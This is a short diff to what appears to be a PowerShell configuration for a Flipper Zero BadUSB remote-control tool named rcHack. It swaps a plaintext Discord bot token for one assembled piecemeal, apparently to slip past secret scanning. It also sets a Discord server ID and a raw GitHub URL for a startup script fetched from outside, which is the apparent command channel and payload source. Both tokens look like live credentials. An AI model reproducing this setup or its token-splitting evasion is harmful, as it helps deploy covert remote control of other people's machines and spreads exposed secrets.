@@ -1,6 +1,19 @@
-$token = "MTIxMTM2NzE1OTgzNDQ3NjU5NQ.GWpDh7.6xAfTD5NzbuOSDt-AzRctKiUyEimTwT69DrH7c"
+$h="MTIxMTM2N"
+$h=$h+"zE1OTgzNDQ3NjU5"
+$h=$h+"N"
+$h=$h+"Q.Gmxb"
+$h=$h+"6W.XbnnHv_0"
+$h=$h+"LC5ZZhsjxVzv1"
+$h=$h+"dq"
+$h=$h+"Ofb_g_"
+$h=$h+"QiN4GUg"
+$h=$h+"iA"
+
+
+$token = $h
 $guildId = "1199979426570584064"
 $StartupPsOnlineFileLocation = "https://raw.githubusercontent.com/MEIR-0-tpg/FlipperBadUSB/main/rcHack/rcHack.ps1"
+
 
 
 
